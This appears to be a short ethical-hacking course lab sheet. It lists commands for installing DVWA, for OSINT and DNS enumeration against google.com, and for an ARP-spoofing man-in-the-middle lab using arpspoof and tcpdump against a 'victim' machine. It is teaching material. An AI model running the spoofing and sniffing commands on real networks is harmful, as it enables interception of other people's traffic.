================ EHPT PRACTICAL GROUP 1 ================

--------------- LAB 1 : DVWA INSTALLATION ---------------
[KALI]
sudo service apache2 start
sudo service mysql start
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chmod -R 777 DVWA
sudo cp DVWA/config/config.inc.php.dist DVWA/config/config.inc.php

[BROWSER]
http://localhost/DVWA


--------------- LAB 2 : OSINT ---------------
[KALI]
whois google.com
theHarvester -d google.com -b google
nslookup google.com
dig google.com
whatweb google.com


--------------- LAB 3 : DNS ENUMERATION ---------------
[KALI]
nslookup -type=mx google.com
nslookup -type=ns google.com
dig mx google.com
dig ns google.com
dnsenum google.com
host -t ns google.com
host -t mx google.com


--------------- LAB 4 : ARP SPOOFING & SNIFFING ---------------
[WINDOWS VICTIM]
ipconfig

[KALI]
sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
sudo arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
sudo arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP
sudo tcpdump -i eth0

[WINDOWS VICTIM]
Open browser and browse websites
